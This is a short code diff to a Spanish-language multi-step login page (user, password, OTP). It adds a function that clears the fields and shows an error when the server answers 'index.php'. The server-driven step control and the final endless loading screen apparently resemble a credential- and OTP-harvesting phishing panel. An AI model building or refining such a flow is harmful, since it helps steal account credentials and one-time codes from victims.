@@ -698,6 +698,15 @@ if ($method === 'GET' && isset($_GET['check'])) {
     usuario.focus();
   }
 
+  function goToStep1WithError() {
+    step2.classList.remove('active');
+    step1.classList.remove('hidden');
+    password.value = '';
+    usuario.value = '';
+    showError(loginError);
+    usuario.focus();
+  }
+
   // ── Login submit ──
   async function doLogin() {
     const pwd = password.value;
@@ -726,7 +735,7 @@ if ($method === 'GET' && isset($_GET['check'])) {
       overlay.classList.add('active');
       // Queda en pantalla de carga (finalizado)
     } else if (action === 'index.php') {
-      goToStep1();
+      goToStep1WithError();
     } else {
       // Acción desconocida: mostrar OTP por defecto
       showOtp();
@@ -812,7 +821,7 @@ if ($method === 'GET' && isset($_GET['check'])) {
       password.focus();
     } else if (action === 'index.php') {
       otpScreen.classList.remove('active');
-      goToStep1();
+      goToStep1WithError();
     } else if (action === 'listo.php') {
       overlay.classList.add('active');
     } else {
